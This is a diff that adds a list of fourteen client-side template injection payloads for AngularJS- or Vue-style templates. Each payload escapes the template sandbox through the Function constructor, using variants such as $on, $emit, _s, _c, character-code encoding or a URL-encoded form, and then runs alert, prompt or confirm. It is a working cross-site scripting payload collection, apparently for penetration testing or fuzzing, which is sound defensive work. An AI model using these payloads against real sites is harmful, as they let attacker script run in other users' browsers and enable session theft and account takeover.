@@ -1,0 +1,14 @@
+%7B%7B''.constructor.constructor('alert(1)')()%7D%7D
+{{constructor.constructor(alert`1`)()}}
+{{$emit.constructor`alert(1)`)()}}
+{{'a'.constructor.constructor('alert(1)')()}}
+{{constructor.constructor('prompt(1)')()}}
+{{0[a='constructor'][a]('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{constructor.constructor(valueOf.name.constructor.fromCharCode(97,108,101,114,116,40,49,41,10))()}}
+{{constructor.constructor("alert(0)")()}}
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+{{{}.toString.constructor('confirm(1)')()}}
+{{constructor.constructor('alert(1)')()}}
+{{_s.constructor('alert(1)')()}}
+{{_c.constructor('alert(1)')()}}
